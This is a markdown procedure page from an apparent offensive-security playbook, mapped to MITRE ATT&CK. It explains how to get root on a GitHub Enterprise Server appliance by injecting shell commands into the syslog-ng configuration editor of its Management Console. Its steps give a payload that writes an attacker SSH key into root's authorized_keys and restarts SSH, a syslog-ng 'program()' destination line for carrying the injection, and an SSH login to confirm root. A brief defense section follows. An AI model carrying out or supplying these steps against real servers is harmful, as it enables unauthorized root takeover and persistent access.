---
id: proc-uuid-2
tags:
  - command-injection
  - rce
  - privilege-escalation
  - syslog-ng
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/inject-ssh-key]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:30:27.203Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Unix Shell]]'
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Exploitation for Privilege Escalation]]'
---
# Inject-Command-in-syslog-ng-Configuration

## Summary

This procedure exploits a command injection vulnerability in the GHES Management Console's syslog-ng configuration editor by inserting arbitrary shell commands that execute with root privileges, enabling privilege escalation to full SSH access on the appliance.

## Description

The syslog-ng configuration file in GHES is editable via the Management Console, but lacks proper sanitization of user input. When the config is saved and processed (e.g., reloaded), injected commands run as root due to the service's elevated context. This allows attackers to execute system commands like adding SSH keys or spawning shells. Target environment: GHES on Linux with syslog-ng enabled. Prerequisites include editor access from the prior procedure. Expected outcomes: root-level command execution and persistent access.

## Requirements

1. Editor role access to GHES Management Console
2. Knowledge of target appliance IP for SSH callback
3. Generated SSH public key for injection
4. Access to syslog-ng config editor

## Defense

Defensive measures and detection strategies:

- Implement input validation and whitelisting for config editors
- Run syslog-ng config processing in a sandboxed environment
- Audit config changes and monitor for anomalous root executions (e.g., via auditd)

## Objectives

1. Inject malicious command into syslog-ng config
2. Trigger execution for privilege escalation
3. Establish root SSH access

## Instructions

### Step 1: Prepare Malicious Injection

**Context**: Craft a command that adds an attacker-controlled SSH key to root's authorized_keys for persistent access.

Generate SSH keypair locally if needed:

Execute [[commands/inject-ssh-key]] to simulate the injection payload:

```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD3... attacker_pubkey' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && service ssh restart
```

> This command appends the key, sets permissions, and restarts SSH to apply changes. Replace with actual key.

### Step 2: Insert into syslog-ng Config

**Context**: Append the payload to the config file in the editor, disguising it within a log directive.

In the Management Console editor:

- Open syslog-ng config
- Add at the end: `destination d_mal { program("$(injected_command_here)" ); };`
- Replace with the prepared command, e.g., using backticks or $( ) for execution
- Save the configuration

> Saving triggers parsing; injected command executes as root if unsanitized.

### Step 3: Verify Escalation

**Context**: Test SSH access using the injected key.

From attacker machine:

```bash
ssh -i private_key root@<ghes-ip>
```

> Successful login indicates escalation; check with `whoami` outputting "root".

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Unix Shell]]
- [[Exploitation for Privilege Escalation]]

### Sub-Techniques

- [[Unix Shell]]

## Commands Used

- [[commands/inject-ssh-key]]

## Tools Used


## Tags

- command-injection
- rce
- syslog-ng
- privilege-escalation
